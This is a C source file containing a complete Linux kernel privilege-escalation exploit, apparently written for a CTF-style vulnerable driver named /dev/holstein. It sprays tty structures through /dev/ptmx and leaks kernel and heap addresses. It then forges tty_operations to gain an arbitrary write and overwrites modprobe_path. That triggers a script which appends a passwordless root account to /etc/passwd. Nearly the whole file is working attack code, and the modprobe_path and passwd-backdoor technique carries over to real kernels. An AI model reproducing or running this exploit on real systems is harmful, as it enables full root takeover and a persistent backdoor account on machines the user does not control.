#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <string.h>
#include <stddef.h>
#include "tty.h"
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    log_info("Rooted!");
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    log_info("Saved user state");
}

#define pause() getchar()
#define dev_file "/dev/holstein"
int global_fd;
void open_dev(){
    global_fd = open(dev_file,O_RDWR);
    if(global_fd < 0)
        errExit("Can't open dev file");
    log_info("Opened dev file");
}
char buf[0x800+0x100];
void read_dev(){
    read(global_fd,buf,sizeof(buf));
}
void write_dev(){
    write(global_fd,buf,sizeof(buf));
}
int spary[50];
int64_t g_buf, _text,modprobe_addr;
char *shell = "/tmp/vjp";
void AAW_32(int fd){ // arbitrary address write 
    int32_t *p =(int32_t *)shell;
    ioctl(fd,p[0],modprobe_addr);
    ioctl(fd,p[1],modprobe_addr+4);
}
int main(int argc,char** argv,char **envp){
    //prepare shell for priv
    system("echo -e \"#!/bin/sh\necho 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\" > /tmp/vjp");
    system("chmod +x /tmp/vjp");
    for(size_t i=0;i<25;i++){
        spary[i]=open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if(spary[i]<0)
            errExit("/dev/ptmx");
    }
    open_dev();
    for(size_t i=25;i<50;i++){
        spary[i]=open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if(spary[i]<0)
            errExit("/dev/ptmx");
    }
    read_dev();
    //memset(buf+0x800,'A',0x4);
    int64_t* leak = (int64_t *)(buf+0x400);
    if( *leak == 0x100005401){
        log_info("struct tty_struct at offset 0x%lx",0x400UL);
        log_info("Leak heap: 0x%lx",leak[7]);
        g_buf = leak[7]-0x438;
        log_info("-> g_buf = 0x%lx",g_buf);
        log_info("Leak kernel: 0x%lx",leak[3]);
        log_info("-> text base: 0x%lx",leak[3]-0xc38880);
        _text = leak[3]-0xc38880;
    }
    else
        errExit("0x%lx",*(int64_t *)(buf+0x400));
    struct tty_operations fake_tty = {0};
    modprobe_addr  = _text+0xe38180;
    fake_tty.ioctl = _text+0xb8375; // mov qword ptr [rdx], rsi ; ret
    memcpy(buf,&fake_tty,sizeof(fake_tty));
    leak[3] = g_buf;
    write_dev();
    for(size_t i=0;i<50;i++){
        AAW_32(spary[i]);
    }
    system("echo -e '\x13\x37\x42\x42' > /tmp/pwn" ); //Non-ascii for /tmp/pwn
    system("chmod +x /tmp/pwn"); 
    system("/tmp/pwn" );  // trigger call modprobe_path
};
